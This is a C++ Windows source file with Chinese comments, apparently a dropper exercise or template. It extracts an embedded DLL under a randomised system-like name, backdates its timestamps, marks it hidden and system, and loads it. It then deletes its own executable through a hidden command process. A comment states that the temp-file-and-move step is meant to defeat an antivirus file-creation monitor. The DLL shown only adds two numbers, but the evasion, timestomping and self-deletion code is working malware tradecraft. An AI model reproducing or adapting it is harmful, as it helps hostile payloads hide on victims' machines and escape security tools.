// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "TLHELP32.H"
#include "resource.h"
#include <shellapi.h>

typedef int(__stdcall *lpAddFun)(int, int); //宏定义函数指针类型

using namespace std;


int SEU_RandEx(int min, int max)
{
	if (min == max)
		return min;

	srand(GetTickCount());
	int seed = rand() + 3;

	return seed % (max - min + 1) + min;
}


BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath)
{
	HGLOBAL hResData;
	HRSRC   hResInfo;
	HANDLE  hFile;
	DWORD   dwBytes;

	char tmpPath[MAX_PATH], outPath[MAX_PATH];

	// 一定要跟别的区分开，GetTickCount有可能得到一样的值


	GetTempPath(MAX_PATH, tmpPath);
	printf(tmpPath);

	//系统开机时钟计数
	wsprintf(outPath, "%s\\%d_res.tmp", tmpPath, GetTickCount());

	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData == NULL) return FALSE;

	hFile = CreateFile(outPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft, LocalFileTime;
	
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft, &LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME)NULL, &LocalFileTime);

	WriteFile(hFile, hResData, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);

	// Fuck KV File Create Monitor
	MoveFile(outPath, lpFilePath);
	SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(outPath);

	return TRUE;
}


//运行完后删除本身
void DelSelf()
{
	char szModule[MAX_PATH],
		szComspec[MAX_PATH],
		szParams[MAX_PATH];
	// 得到文件路径:
	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		// 设置命令参数
		wsprintf(szParams, " /c del %s > nul", szModule);
		lstrcat(szComspec, szParams);

		// 设置结构体成员
		STARTUPINFO  si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		// 为程序分配资源
		::SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		// 调用命令
		if (CreateProcess(0, szComspec, 0, 0, 0, CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// 暂停命令直到程序退出
			::SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
			::SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);
			// 恢复命令并设置低优先权
			::ResumeThread(pi.hThread);
			return;
		}
		else // 如果出错，格式化分配的空间
		{
			::SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
}
//在其中出现了宽字节的问题，很麻烦 Tchar 就是宽字节

int main()
{
	
	char mDllPath[MAX_PATH];
	char mCurrentPath[MAX_PATH];

	GetCurrentDirectory(MAX_PATH, mCurrentPath);
	printf(mCurrentPath);
	
	wsprintf(mDllPath, "%s\\S%cm%ct%cH.dll", mCurrentPath, SEU_RandEx('a', 'z'), SEU_RandEx('b', 'y'), SEU_RandEx('c', 'x'));
	printf(mDllPath);

	ReleaseResource(NULL, IDR_DLL1, "DLL", mDllPath);//释放DLL文件
	
	//wsprintf(mDllPath, "%s\\..\\Debug\\Dllmain.dll", mCurrentPath);
	//printf(mDllPath);
	


	
	HMODULE mDllModule = LoadLibrary(mDllPath);
	if (mDllModule)
	{
		BOOL(_stdcall *addFunc)(int, int);
		//定义函数类型的指针 以接收返回的函数地址
		//__stdcall 很重要 否则报错说类型不匹配

		//(FARPROC&)addFunc = GetProcAddress(mDllModule, "add");
		//通过函数符号名
		(FARPROC&)addFunc = GetProcAddress(mDllModule, MAKEINTRESOURCE(1));
		//通过def文件中的导出符号的序号

		if (addFunc)
		{
			int result = addFunc(2, 26);
			printf("\ncall add in dll:%d\n", result);

		}
		FreeLibrary(mDllModule);
	}
	else
	{
		cout << "\n Dll load failed! \n";
		return 0;
	}

	DelSelf();
    return 0;
}

